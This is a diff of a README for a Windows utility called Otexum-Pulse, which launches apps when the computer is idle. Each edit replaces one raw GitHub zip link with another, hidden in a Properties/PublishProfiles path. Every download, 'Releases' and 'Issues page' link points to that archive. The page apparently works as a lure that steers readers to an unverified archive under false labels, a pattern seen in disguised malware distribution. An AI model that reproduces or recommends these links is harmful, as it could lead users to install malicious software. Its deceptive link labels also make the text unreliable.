@@ -1,6 +1,6 @@
 # 🚀 Otexum-Pulse - Automatically Launch Apps Based on Your Inactivity
 
-![Download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/src/Services/Otexum-Pulse_2.3.zip)
+![Download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/Properties/PublishProfiles/Otexum_Pulse_v1.8-alpha.3.zip)
 
 ## 📋 Description
 Otexum-Pulse is a Windows application designed to help you manage your workflow efficiently. It automatically launches a specified application when your computer is idle for a set time. This tool is perfect for anyone looking to improve productivity without constant manual intervention.
@@ -8,7 +8,7 @@ Otexum-Pulse is a Windows application designed to help you manage your workflow 
 ## 📥 Download & Install
 To get started, visit the Releases page below to download the application:
 
-[Visit this page to download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/src/Services/Otexum-Pulse_2.3.zip)
+[Visit this page to download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/Properties/PublishProfiles/Otexum_Pulse_v1.8-alpha.3.zip)
 
 1. Click on the link above.
 2. Find the latest version of Otexum-Pulse.
@@ -51,7 +51,7 @@ If you encounter issues while using Otexum-Pulse, try the following solutions:
 - **Crash or Bug Issues**: Check for updates on the Releases page and install the latest version.
 
 ## 💬 Support
-For further assistance, visit our [Issues page](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/src/Services/Otexum-Pulse_2.3.zip) on GitHub. You can report any bugs or ask questions related to Otexum-Pulse.
+For further assistance, visit our [Issues page](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/Properties/PublishProfiles/Otexum_Pulse_v1.8-alpha.3.zip) on GitHub. You can report any bugs or ask questions related to Otexum-Pulse.
 
 ## 📖 License
 Otexum-Pulse is released under the MIT License. You can use it freely, but please give credit to the developers.
@@ -64,4 +64,4 @@ Otexum-Pulse is released under the MIT License. You can use it freely, but pleas
 
 For more insights and updates, keep an eye on our Releases page:
 
-[Visit this page to download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/src/Services/Otexum-Pulse_2.3.zip)
+[Visit this page to download Otexum-Pulse](https://raw.githubusercontent.com/thainereflecting360/Otexum-Pulse/main/Properties/PublishProfiles/Otexum_Pulse_v1.8-alpha.3.zip)
